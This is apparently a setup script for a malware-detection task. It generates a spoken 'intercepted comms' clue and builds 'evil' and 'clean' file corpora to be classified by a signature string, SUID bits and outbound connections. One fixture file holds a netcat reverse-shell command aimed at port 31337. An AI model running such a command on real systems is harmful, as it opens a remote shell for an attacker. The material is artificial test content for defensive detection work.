#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip ffmpeg espeak
    pip3 install pytest

    mkdir -p /app/corpus/evil
    mkdir -p /app/corpus/clean

    # Generate audio file
    espeak -w /app/intercepted_comms.wav "Deploy the new implants. The primary dropper is an ELF executable that must have the SUID bit set to maintain persistence, and it contains the hardcoded signature payload 'VOID_DRAGON_0x99' in its binary structure. Additionally, the fallback mechanism uses plain text scripts that initiate outbound connections to our external listener on port 31337. Ensure all tooling matches these specifications."

    # Create ELF files
    cp /bin/true /app/corpus/evil/payload1.elf
    echo "VOID_DRAGON_0x99" >> /app/corpus/evil/payload1.elf
    chmod u+s /app/corpus/evil/payload1.elf

    cp /bin/true /app/corpus/clean/normal.elf
    chmod u+s /app/corpus/clean/normal.elf

    cp /bin/true /app/corpus/clean/benign.elf
    echo "VOID_DRAGON_0x99" >> /app/corpus/clean/benign.elf

    # Create text files
    echo "nc -e /bin/sh 10.0.0.5 31337" > /app/corpus/evil/script1.sh
    echo "curl https://example.com:443" > /app/corpus/clean/script2.sh
    echo "port 8080 accessed" > /app/corpus/clean/log.txt

    useradd -m -s /bin/bash user || true
    chmod -R 777 /home/user
